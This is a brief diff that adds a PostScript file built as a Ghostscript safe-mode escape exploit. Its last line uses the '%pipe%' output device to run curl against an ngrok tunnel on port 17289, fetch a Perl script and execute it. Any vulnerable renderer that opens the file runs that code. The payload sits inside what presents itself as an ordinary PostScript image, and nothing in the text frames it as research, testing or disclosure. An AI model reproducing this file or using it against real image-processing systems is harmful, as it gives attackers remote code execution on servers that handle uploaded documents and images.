@@ -1,0 +1,9 @@
+%!PS-Adobe-1.0
+%%BoundingBox:  0   0  1000  500
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%curl http://0.tcp.ngrok.io:17289/perl.pl | perl) currentdevice putdeviceprops
